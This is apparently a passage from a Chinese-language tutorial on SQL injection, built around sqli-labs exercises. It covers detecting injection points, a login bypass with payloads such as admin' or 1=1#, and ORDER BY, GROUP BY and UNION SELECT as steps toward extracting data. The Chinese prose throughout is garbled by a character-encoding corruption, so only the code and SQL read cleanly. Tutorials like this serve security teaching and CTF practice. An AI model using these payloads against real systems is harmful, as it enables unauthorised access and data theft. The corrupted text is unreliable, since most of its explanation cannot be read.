<p>æ³¨æ„ç‚¹ï¼š</p>
<ol type="1">
<li>stmt_name ä½œä¸º preparable_stmt çš„æ¥æ”¶è€…ï¼Œå”¯ä¸€æ ‡è¯†ï¼Œä¸åŒºåˆ†å¤§å°å†™ï¼›</li>
<li>preparable_stmt è¯­å¥ä¸­çš„ ? æ˜¯ä¸ªå ä½ç¬¦ï¼Œæ‰€ä»£è¡¨çš„æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä¸éœ€è¦å°† ? ç”¨å¼•å·åŒ…å«èµ·æ¥ï¼›</li>
<li>å®šä¹‰ä¸€ä¸ªå·²å­˜åœ¨çš„ stmt_name ï¼ŒåŸæœ‰çš„å°†è¢«ç«‹å³é‡Šæ”¾ï¼Œç±»ä¼¼äºå˜é‡çš„é‡æ–°èµ‹å€¼ï¼›</li>
<li>PREPARE stmt_name çš„ä½œç”¨åŸŸæ˜¯sessionçº§</li>
</ol>
<p>é¢„å¤„ç†ç¼–è¯‘ SQL æ˜¯å ç”¨èµ„æºçš„ï¼Œæ‰€ä»¥åœ¨ä½¿ç”¨åæ³¨æ„åŠæ—¶ä½¿ç”¨ DEALLOCATE PREPARE é‡Šæ”¾èµ„æºï¼Œè¿™æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ã€‚</p>
<h1 id="å¸¸è§„æ³¨å…¥æ–¹æ³•è¯¦è§£">2. å¸¸è§„æ³¨å…¥æ–¹æ³•è¯¦è§£</h1>
<p><strong>æ³¨æ„ï¼šä»¥ä¸‹æ¼”ç¤ºçš„éƒ½æ˜¯åœ¨æ²¡æœ‰è¿‡æ»¤çš„æƒ…å†µä¸‹è¿›è¡Œçš„ï¼Œè¿‡æ»¤ç»•è¿‡å•ç‹¬å‡ºä¸€ç« ã€‚</strong></p>
<h2 id="æ³¨å…¥ä¹‹å‰çš„æ­¥éª¤">2.1. æ³¨å…¥ä¹‹å‰çš„æ­¥éª¤</h2>
<p>åœ¨æ³¨å…¥ä¹‹å‰ä¸€èˆ¬éƒ½éœ€è¦åšä¸‰ä»¶äº‹ï¼š</p>
<ol type="1">
<li>åˆ¤æ–­æ³¨å…¥ç‚¹ï¼›</li>
<li>åˆ¤æ–­ç±»å‹ï¼ˆä¸»è¦åŒ…æ‹¬å˜é‡ç±»å‹å’Œæ˜¯å¦æœ‰å›æ˜¾ï¼‰ï¼›</li>
<li>fuzzè¿‡æ»¤åå•ï¼›</li>
</ol>
<h3 id="ç¬¬12ä»¶äº‹">2.1.1. ç¬¬1ï¼Œ2ä»¶äº‹</h3>
<p>ä½†æ˜¯å‰ä¸¤è€…ä¸€èˆ¬éƒ½æ˜¯åŒæ—¶è¿›è¡Œçš„ã€‚<strong>å› ä¸ºåˆ¤æ–­æ³¨å…¥ç‚¹ä¸€èˆ¬æ˜¯é€šè¿‡ä¼ å…¥ä¸åŒçš„å‚æ•°ï¼Œç„¶åè§‚å¯Ÿè¿”å›çš„é¡µé¢æ˜¯å¦æœ‰å¼‚å¸¸æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨æ³¨å…¥ç‚¹ï¼›è€Œåˆ¤æ–­å˜é‡ç±»å‹ä¹Ÿæ˜¯é€šè¿‡ä¼ å…¥ä¸åŒçš„é—­åˆæ–¹å¼æ¥è§‚å¯Ÿè¿”å›çš„é¡µé¢æ˜¯å¦æœ‰å¼‚å¸¸ä»è€Œå¾—åˆ°ç»“æœ</strong>ã€‚</p>
<p>ç®€å•è¯´ä¸‹æˆ‘å¸¸ç”¨çš„åŠæ³•ã€‚é¦–å…ˆåˆ†åˆ«å°è¯•å¦‚ä¸‹ä¸¤ä¸ªpayloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1=1 # æ­¤æ—¶ä¼ å…¥çš„å‚æ•°idçš„å€¼ä¸º 1=1</span><br><span class="line">?id=1=2 # æ­¤æ—¶ä¼ å…¥çš„å‚æ•°idçš„å€¼ä¸º 1=2</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœæ˜¯æ•°å­—å‹çš„ï¼ˆæ²¡æœ‰é—­åˆæ–¹å¼ï¼‰ï¼Œå‡è®¾åå°è¯­å¥å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">select username,password <span class="keyword">from</span> users where id = <span class="variable">$id</span>;</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆä¸Šè¿°ä¸¤ä¸ªå‚æ•°ä¼ å…¥ä¹‹åçš„æŸ¥è¯¢è¯­å¥åˆ†åˆ«ä¸ºï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span>;</span><br></pre></td></tr></table></figure></p>
<p>å› ä¸ºä¼šå…ˆè®¡ç®—åé¢çš„ï¼Œç„¶åå†èµ‹å€¼ç»™idï¼Œä»è€Œæœ€åçš„è¯­å¥ä¸ºï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">1</span>; # <span class="number">1</span> <span class="operator">=</span> <span class="number">1</span> ä¸ºçœŸï¼Œæ‰€ä»¥æœ€åå€¼ä¸º<span class="number">1</span></span><br><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="number">0</span>; # <span class="number">1</span> <span class="operator">=</span> <span class="number">2</span> ä¸ºå‡ï¼Œæ‰€ä»¥æœ€åå€¼ä¸º<span class="number">0</span></span><br></pre></td></tr></table></figure></p>
<p>æ‰€ä»¥å‰è€…ä¼šè¿”å›id=1çš„ç”¨æˆ·çš„ä¿¡æ¯ï¼›è€Œåè€…è¿”å›id=0çš„ç”¨æˆ·ä¿¡æ¯ï¼Œä½†æ˜¯ä¸€èˆ¬ä¸å­˜åœ¨id=0çš„ä¿¡æ¯ï¼Œæ‰€ä»¥ä¸ä¼šæœ‰ç»“æœã€‚ä»è€Œå°±å¯ä»¥åˆ¤æ–­å‡ºå­˜åœ¨æ³¨å…¥ç‚¹ï¼Œå¹¶ä¸”å˜é‡ç±»å‹ä¸ºæ•°å­—å‹ã€‚</p>
<p>ä»¥sqli-labsçš„ç¬¬2å…³ä¸ºä¾‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423193717.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423193701.png" /></p>
<p>ä½†æ˜¯ï¼Œå¦‚æœæ˜¯å­—ç¬¦å‹çš„ï¼Œé‚£ä¹ˆä¸Šè¿°ä¸¤è€…å¾—åˆ°çš„é¡µé¢éƒ½æ˜¯ä¸€æ ·çš„ã€‚å‡è®¾åå°è¯­å¥å¦‚ä¸‹ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?id=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">select username,password <span class="keyword">from</span> users where id = <span class="string">&#x27;$id&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>é‚£ä¹ˆä¸Šè¿°ä¸¤ä¸ªpayloadä¼ å…¥ä¹‹åçš„è¯­å¥ä¸ºï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1=1&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1=2&#x27;</span>;</span><br></pre></td></tr></table></figure></p>
<p>æ­¤æ—¶'1=1'å› ä¸ºè¢«å•å¼•å·åŒ…è£¹ï¼Œä»è€Œä¸ä¼šè¢«å½“ä½œä¸€ä¸ªå¼å­è¢«æ‰§è¡Œã€‚</p>
<blockquote>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªå…³äºæ•°æ®åº“çš„å°çŸ¥è¯†ï¼šå¦‚æœæ•°æ®åº“ä¸­idä¸ºintå‹çš„ï¼Œä½†æ˜¯æŸ¥è¯¢è¯­å¥ä¸­çš„idä¸ºå­—ç¬¦å‹çš„ï¼Œé‚£ä¹ˆæ•°æ®åº“ä¼šå…ˆå°†æŸ¥è¯¢è¯­å¥ä¸­çš„å­—ç¬¦ä¸²å˜æˆæ•°å­—ï¼Œç„¶åå†ä¸æ•°æ®åº“ä¸­çš„idä½œæ¯”è¾ƒã€‚</p>
<p>å­—ç¬¦ä¸²å˜æˆæ•°å­—çš„è§„åˆ™ï¼šå¦‚æœå­—ç¬¦ä¸²çš„å¼€å¤´ä¸ºæœ‰æ•ˆæ•°å­—ï¼Œé‚£ä¹ˆä»ç¬¬ä¸€ä¸ªæ•°å­—å¼€å§‹åˆ°ç¬¬ä¸€ä¸ªéæœ‰æ•ˆæ•°å­—ä¸ºæ­¢ï¼Œå­—ç¬¦ä¸²å°±ä¼šå˜æˆè¿™ä¸²æ•°å­—ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œid='123adf1341'é‚£ä¹ˆidæœ€ç»ˆä¼šå˜æˆid=123ã€‚è¿™é‡Œè¦æ³¨æ„ï¼Œå¦‚æœç¬¬ä¸€ä½ä¸º0ï¼Œå³id='0123adf1341'ï¼Œé‚£ä¹ˆæœ€ç»ˆè¿˜æ˜¯ä¸ºid=123ã€‚</p>
<p>ä¾‹å­ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195043.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195103.png" /></p>
</blockquote>
<p>ä»¥sqli-labsç¬¬1å…³ä¸ºä¾‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195227.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423195241.png" /></p>
<p>å› æ­¤ï¼Œå­—ç¬¦å‹çš„ä¸èƒ½é€šè¿‡è¿™ä¸¤ä¸ªpayloadåˆ¤æ–­ã€‚é‚£ä¹ˆæ¥ä¸‹æ¥å°±ä¼šåˆ†åˆ«ä½¿ç”¨å¦‚ä¸‹ä¸¤ä¸ªpayloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;</span><br><span class="line">?id=1&#x27;#</span><br></pre></td></tr></table></figure></p>
<p>ä¸Šé¢payloadå¸¦å…¥ä¹‹åçš„åå°è¯­å¥åˆ†åˆ«ä¸ºï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;&#x27;;</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span>#<span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure>
<p>ç¬¬1ä¸ªsqlè¯­å¥å› ä¸ºå¤šäº†ä¸€ä¸ªå•å¼•å·ä¼šæŠ¥é”™ï¼›ç¬¬2ä¸ªsqlè¯­å¥ä¸­æœ€åçš„å•å¼•å·è¢«æ³¨é‡Šï¼Œå› æ­¤ä¼šè¿”å›id=1çš„ç»“æœã€‚</p>
<blockquote>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸Šé¢çš„åˆ†å·éƒ½æ˜¯phpä»£ç ä¸­çš„ï¼Œå¹¶ä¸æ˜¯çœŸæ­£å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢æ—¶çš„åˆ†å·ã€‚åœ¨phpä¸­ï¼Œè¿™äº›ç¬¦å·éƒ½ä»…ä»…åªæ˜¯å­—ç¬¦ï¼Œå¹¶ä¸ä¼šçœŸçš„å°†åé¢çš„å•å¼•å·å’Œ;æ³¨é‡Šæ‰ï¼Œåªæœ‰å½“æŠŠè¯­å¥å¸¦å…¥æ•°æ®åº“æŸ¥è¯¢æ—¶ï¼Œè¿™äº›ç¬¦å·æ‰å‘æŒ¥åŸæ¥çš„ä½œç”¨ï¼Œè¿™æ—¶ä¼šè‡ªåŠ¨è¡¥ä¸Šæœ€åçš„;ï¼Œå› æ­¤ä¸ç”¨å½“å¿ƒæ²¡æœ‰;ä»è€Œæ•°æ®åº“æ²¡æ³•æ‰§è¡Œè¯­å¥ã€‚</p>
</blockquote>
<p>è¿˜æ˜¯sqli-labsç¬¬1å…³ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423201606.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423201720.png" /></p>
<blockquote>
<p>æ³¨é‡Šè¦æ¢ç€ç”¨ï¼Œæœ‰æ—¶å€™ç”¨#ä¸è¡Œï¼Œå°±æ¢-- ï¼Œä¸è¿‡urlä¸­ç”¨+ä»£æ›¿ï¼Œæ‰€ä»¥æ˜¯--+ã€‚</p>
</blockquote>
<p>å¦‚æœé—­åˆæ–¹å¼æ˜¯åŒå¼•å·ï¼Œé‚£ä¹ˆå°±å°†payloadä¸­çš„å•å¼•å·æ¢æˆåŒå¼•å·å³å¯ï¼Œå…¶ä»–é—­åˆæ–¹å¼ä¹Ÿæ˜¯ä¸€æ ·çš„é“ç†ï¼Œ<strong>æ€»ä¹‹å°±æ˜¯å°†å‰é¢çš„ç¬¦å·é—­åˆï¼Œåé¢çš„ç¬¦å·æ³¨é‡Š</strong>ã€‚æœ€å¸¸è§çš„å°±æ˜¯å•å¼•å·äº†ï¼Œå½“ç„¶ä¸æ’é™¤æœ‰çš„é¢˜ç›®æ¶å¿ƒäººã€‚</p>
<hr />
<p>ä¸Šé¢è®²çš„åŸºæœ¬å°±æ˜¯å˜é‡ç±»å‹ï¼Œä¸‹é¢è®²çš„å°±æ˜¯å…³äºå›æ˜¾çš„ã€‚</p>
<h3 id="ç¬¬3ä»¶äº‹">2.1.2. ç¬¬3ä»¶äº‹</h3>
<p>é¦–å…ˆè¦fuzzä»¥ä¸‹è¿‡æ»¤çš„ç‰¹æ®Šå­—ç¬¦å’Œé‡è¦å…³é”®è¯ï¼Œè¿™æ ·å­æ–¹ä¾¿åé¢æ³¨å…¥è¯­å¥çš„ç¼–å†™ã€‚ç›´æ¥ç”¨burpçˆ†ç ´å³å¯ã€‚</p>
<p>æ¨èä¸€ä¸ªæˆ‘å¸¸ç”¨çš„å­—å…¸ï¼š - <a href="https://github.com/TheKingOfDuck/fuzzDicts">GitHub - TheKingOfDuck/fuzzDicts: Web Pentesting Fuzz å­—å…¸,ä¸€ä¸ªå°±å¤Ÿäº†ã€‚</a></p>
<h2 id="ä¸‡èƒ½å¯†ç ">2.2. ä¸‡èƒ½å¯†ç </h2>
<p>åå°è¯­å¥ä¸€èˆ¬æ˜¯ï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = select * <span class="keyword">from</span> users where username=<span class="string">&#x27;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;un&#x27;</span>].<span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> password = <span class="string">&#x27;&#x27;</span>.<span class="variable">$_GET</span>[<span class="string">&#x27;pw&#x27;</span>].<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span> !== <span class="literal">null</span>)&#123;</span><br><span class="line">	<span class="keyword">print</span>(<span class="string">&#x27;Login Success&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p><code>''.$_GET['un'].''</code>å…¶å®é—­åˆæ–¹å¼è¿˜æ˜¯å•å¼•å·ã€‚</p>
<p><code>'.$_GET['un'].'</code>ä¸­çš„<code>.</code>æ˜¯phpä¸­çš„å­—ç¬¦ä¸²æ‹¼æ¥ç¬¦å·ï¼Œç±»æ¯”åšpythonä¸­çš„<code>+</code>ï¼›è€Œå¤–é¢çš„å•å¼•å·å°±æ˜¯ä¿è¯é‡Œé¢çš„å†…å®¹æ˜¯å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç±»æ¯”åšpythonä¸­çš„str()çš„ä½œç”¨ã€‚</p>
</blockquote>
<p>å¦‚æœæˆ‘ä»¬è¾“å…¥å¦‚ä¸‹payloadï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?un=admin&#x27; or 1=1#&amp;pw=123456</span><br></pre></td></tr></table></figure></p>
<p>æ­¤æ—¶çš„åå°è¯­å¥ä¸ºï¼š <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$result</span> = select * <span class="keyword">from</span> users where username=<span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">#&#x27; and password = &#x27;123456&#x27;;</span></span><br></pre></td></tr></table></figure></p>
<p>æ­¤æ—¶çš„æŸ¥è¯¢è¯­å¥å°±ç›¸å½“äºä¸‹é¢çš„è¯­å¥ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;</span><br></pre></td></tr></table></figure></p>
<p>è§£é‡Šï¼šæ­¤æ—¶whereåé¢çš„åˆ¤æ–­æ¡ä»¶æœ‰ä¸¤ä¸ª 1. ç¬¬ä¸€ä¸ªï¼šusername='admin' 2. ç¬¬äºŒä¸ªï¼š1=1</p>
<p>ä¸¤ä¸ªåˆ¤æ–­æ¡ä»¶ç”¨ or è¿æ¥ï¼Œæ— è®ºå‰é¢çš„åˆ¤æ–­æ¡ä»¶çš„ç»“æœæ˜¯ä»€ä¹ˆï¼Œæœ€åéƒ½æ˜¯<code>any or 1 = 1</code>ï¼Œå› æ­¤whereåé¢çš„æ¡ä»¶ä¸ºçœŸï¼Œæ­¤æ—¶ç›¸å½“äºæ‰§è¡Œäº†<code>select * from users;</code>ï¼Œå› æ­¤è‚¯å®šä¼šè¿”å›ç»“æœï¼Œé‚£ä¹ˆ<code>$result</code>è‡ªç„¶å°±ä¸ä¼šnullï¼Œä»è€ŒæˆåŠŸç™»å½•ã€‚</p>
<p>è¿™ç§æ–¹æ³•å¾ˆå°‘ï¼Œä¸è¿‡ä¹Ÿæœ‰ã€‚è¿™é‡Œçš„æ³¨å…¥ç‚¹æ˜¯åœ¨usernameï¼Œå½“ç„¶ä¹Ÿå¯èƒ½åœ¨passwordã€‚ä¾‹é¢˜ï¼š[[Redtiger's_Hackit_WriteUp#Level-2]]</p>
<h2 id="è”åˆæŸ¥è¯¢æ³¨å…¥">2.3. è”åˆæŸ¥è¯¢æ³¨å…¥</h2>
<p>è¿™æ˜¯æœ€æœ€å¸¸è§çš„åˆ©ç”¨æ–¹å¼ã€‚ä¸»è¦çš„æ­¥éª¤æœ‰ï¼šï¼ˆä¸åŒ…æ‹¬æ³¨å…¥å‰çš„æ­¥éª¤ï¼‰</p>
<ol type="1">
<li><p>åˆ©ç”¨ order/group by åˆ¤æ–­å­—æ®µæ•°ï¼Œå¹¶ä¸”ç¡®å®šå›æ˜¾ä½ï¼›ç¡®å®šå­—æ®µæ•°çš„åŸå› ï¼šunion select è¦æ±‚æŸ¥è¯¢çš„å­—æ®µæ•°å’Œè¡¨ä¸­çš„å­—æ®µæ•°ä¿æŒä¸€è‡´ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423205609.png" /></p></li>
<li><p>åˆ©ç”¨ union select è·å–æ•°æ®åº“åï¼›</p></li>
<li><p>åˆ©ç”¨ union select è·å–ç‰¹å®šæ•°æ®åº“ä¸‹çš„æ‰€æœ‰è¡¨åï¼›</p></li>
<li><p>åˆ©ç”¨ union select è·å–ç‰¹å®šè¡¨ä¸‹é¢çš„æ‰€æœ‰åˆ—åï¼›</p></li>
<li><p>åˆ©ç”¨ union select è·å–è·å–ç‰¹å®šåˆ—çš„ä¿¡æ¯ï¼›</p></li>
</ol>
<p>ä¸‹é¢å…ˆä»‹ç»è¿™å…¶ä¸­éœ€è¦ç”¨åˆ°çš„ä¸€äº›å‡½æ•°ï¼Œç„¶ååœ¨æŒ‰ç…§æ­¥éª¤åˆ†åˆ«è¯´æ˜ã€‚</p>
<h3 id="éœ€è¦ç”¨åˆ°çš„å‡½æ•°">2.3.1. éœ€è¦ç”¨åˆ°çš„å‡½æ•°</h3>
<h4 id="ordergroup-by">2.3.1.1. order/group by</h4>
<h5 id="order-by">2.3.1.1.1. order by</h5>
<p>ä½œç”¨ï¼šORDER BY å…³é”®å­—ç”¨äºå¯¹ç»“æœé›†æŒ‰ç…§ä¸€ä¸ªåˆ—æˆ–è€…å¤šä¸ªåˆ—è¿›è¡Œæ’åºã€‚ORDER BY å…³é”®å­—é»˜è®¤æŒ‰ç…§å‡åºå¯¹è®°å½•è¿›è¡Œæ’åºã€‚å¦‚æœéœ€è¦æŒ‰ç…§é™åºå¯¹è®°å½•è¿›è¡Œæ’åºï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ DESC å…³é”®å­—ã€‚</p>
<p>order byè¯­æ³•ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> columnName1,columnName2,... <span class="keyword">from</span> tableName <span class="keyword">order</span> <span class="keyword">by</span> columnName1,columnName2 [<span class="keyword">ASC</span><span class="operator">|</span><span class="keyword">DESC</span>];</span><br></pre></td></tr></table></figure></p>
<p>æ¼”ç¤ºï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423211816.png" /></p>
<p>å¯ä»¥çœ‹åˆ°ä½¿ç”¨äº† order by ä¹‹åè¿”å›çš„ç»“æœçš„é¡ºåºå‘ç”Ÿäº†æ”¹å˜ã€‚</p>
<hr />
<h5 id="group-by">2.3.1.1.2. group by</h5>
<p>ä½œç”¨ï¼šGROUP BY è¯­å¥ç”¨äºé…åˆèšåˆå‡½æ•°ï¼Œæ ¹æ®ä¸€ä¸ªæˆ–å¤šä¸ªåˆ—å¯¹ç»“æœé›†è¿›è¡Œåˆ†ç»„ã€‚</p>
<p>group byè¯­æ³•ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> columnName1, aggregate_function(columnName) <span class="keyword">from</span> tableName <span class="keyword">group</span> <span class="keyword">by</span> columnName;</span><br></pre></td></tr></table></figure></p>
<p>å¸¸ç”¨èšåˆå‡½æ•°ï¼š - count(): è®¡æ•° - sum(): æ±‚å’Œ - avg(): æ±‚å¹³å‡æ•° - max(): æ±‚æœ€å¤§å€¼ - min(): æ±‚æœ€å°å€¼</p>
<p>usersè¡¨ä¸­çš„å†…å®¹å¦‚ä¸‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+------+----------+----------+--------+                                                                                                                                                         | id   | username | password | camp   |                                                                                                                                                         +------+----------+----------+--------+                                                                                                                                                         |    1 | admin    | admin    | admin  |                                                                                                                                                         |    2 | root     | root     | root   |                                                                                                                                                         |    3 | hdf      | hdf      | common |                                                                                                                                                         |    4 | xioazz   | xiozz    | common |                                                                                                                                                         |    5 | you      | you      | common |                                                                                                                                                         |    6 | run      | run      | common |                                                                                                                                                         +------+----------+----------+--------+</span><br></pre></td></tr></table></figure></p>
<p>å¦‚æœåªä½¿ç”¨group byè€Œä¸ä½¿ç”¨èšåˆå‡½æ•°ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423214751.png" /></p>
<p>å¯ä»¥çœ‹åˆ°ï¼Œåªè¿”å›äº†3ä¸ªç»“æœï¼Œä¹Ÿå°±æ˜¯ä¸åŒcampå­—æ®µçš„è¿”å›ä¸€ä¸ªã€‚</p>
<p>å¦‚æœé…åˆä¸Šèšåˆå‡½æ•°ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423214943.png" /></p>
<p>æ­¤æ—¶è™½ç„¶è¿˜æ˜¯è¿”å›ä¸‰ä¸ªç»“æœï¼Œä½†æ˜¯åŠ å…¥äº†èšåˆå‡½æ•°<code>max(id)</code>ï¼Œæ­¤æ—¶è¿”å›çš„æ˜¯ä¸åŒcampä¸­çš„idæœ€å¤§çš„ç”¨æˆ·ã€‚å¦‚æœæ˜¯<code>sum(id)</code>ï¼Œé‚£å°±æ˜¯æ±‚ä¸åŒcampä¸­æ‰€æœ‰ç”¨æˆ·çš„idçš„å’Œ</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423215300.png" /></p>
<p><strong>group by (key)è¿˜æœ‰ä¸€ä¸ªç‰¹æ€§ï¼šé‚£å°±æ˜¯å®ƒä¼šæ ¹æ®åé¢çš„keyåˆ†ç»„ï¼Œå¹¶ä¸”å°†keyä½œä¸ºä¸»é”®ï¼Œä¸´æ—¶ç”Ÿæˆä¸€ä¸ªè¡¨ï¼Œç„¶åå¾€é‡Œé¢å¡«å…¥ä¿¡æ¯ï¼Œæœ€åå°†è¿™ä¸ªä¸´æ—¶çš„è¡¨è¿”å›ä½œä¸ºç»“æœã€‚</strong></p>
<p>å‡è®¾è¯­å¥ä¸º<code>select count(*),camp from users group by camp;</code>ï¼Œè¡¨è¿˜æ˜¯ä¸Šé¢é‚£ä¸ªè¡¨ã€‚</p>
<p>ç»“æœä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">+----------+--------+</span><br><span class="line">| count(*) | camp   |</span><br><span class="line">+----------+--------+</span><br><span class="line">|        1 | admin  |</span><br><span class="line">|        4 | common |</span><br><span class="line">|        1 | root   |</span><br><span class="line">+----------+--------+</span><br></pre></td></tr></table></figure></p>
<p>ç°åœ¨æ¥æè¿°ä¸€ä¸‹è¿‡ç¨‹ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åˆšå¼€å§‹æ˜¯ç©ºè¡¨ï¼š</span><br><span class="line">+----------+--------+</span><br><span class="line">| count(*) | camp   |</span><br><span class="line">+----------+--------+</span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢åˆ°ç¬¬ä¸€æ¡ä¿¡æ¯ï¼Œcampä¸ºadminï¼Œä½†æ˜¯æ­¤æ—¶ä¸´æ—¶è¡¨ä¸­æ²¡æœ‰ä»»ä½•ä¸»é”®ï¼Œå› æ­¤å…ˆå°†ä¸»é”®æ’å…¥ï¼Œç„¶åcount(*)çš„å€¼+1ï¼Œå› æ­¤å¾—åˆ°ï¼š</span><br><span class="line">+----------+--------+</span><br><span class="line">| count(*) | camp   |</span><br><span class="line">+----------+--------+</span><br><span class="line">|        1 | admin  |</span><br><span class="line">+----------+--------+</span><br><span class="line"></span><br><span class="line">æŸ¥è¯¢åˆ°ç¬¬äºŒæ¡æ¶ˆæ¯ï¼Œcampä¸ºcommonï¼Œæ­¤æ—¶è¡¨ä¸­æ²¡æœ‰è¯¥ä¸»é”®ï¼Œå› æ­¤å…ˆå°†ä¸»é”®æ’å…¥ï¼Œç„¶åæŠŠå¯¹åº”çš„count(*)å€¼+1ï¼Œå¾—åˆ°ï¼š</span><br><span class="line">+----------+--------+</span><br><span class="line">| count(*) | camp   |</span><br><span class="line">+----------+--------+</span><br><span class="line">|        1 | admin  |</span><br><span class="line">|        1 | common |</span><br><span class="line">+----------+--------+</span><br><span class="line"></span><br><span class="line">ä¸‹æ¬¡campè¿˜æ˜¯commonï¼Œæ­¤æ—¶è¡¨ä¸­å·²å­˜åœ¨è¯¥ä¸»é”®ï¼Œç›´æ¥å°†count(*)å€¼+1ï¼Œå¾—åˆ°ï¼š</span><br><span class="line">+----------+--------+</span><br><span class="line">| count(*) | camp   |</span><br><span class="line">+----------+--------+</span><br><span class="line">|        1 | admin  |</span><br><span class="line">|        2 | common |</span><br><span class="line">+----------+--------+</span><br><span class="line"></span><br><span class="line">ä¸‹é¢ä¹Ÿæ˜¯ä¸€æ ·çš„é“ç†....</span><br><span class="line"></span><br></pre></td></tr></table></figure></p>
<h4 id="union-select">2.3.1.2. union select</h4>
<p>unionå…³é”®è¯çš„ä½œç”¨æ˜¯åˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ªselectè¯­å¥çš„ç»“æœã€‚</p>
<p>è¯­æ³•ï¼š <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> columnName1[,columnName2,...] <span class="keyword">from</span> users <span class="keyword">union</span> <span class="keyword">select</span> columnName3[,columnName4,...] <span class="keyword">from</span> tableName;</span><br></pre></td></tr></table></figure></p>
<p>ä¾‹å­ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220423215629.png" /></p>
<p>è¿”å›çš„ç»“æœä¸­æ—¢åŒ…å«idçš„ç»“æœï¼Œè¿˜åŒ…å«passwordçš„ç»“æœã€‚</p>
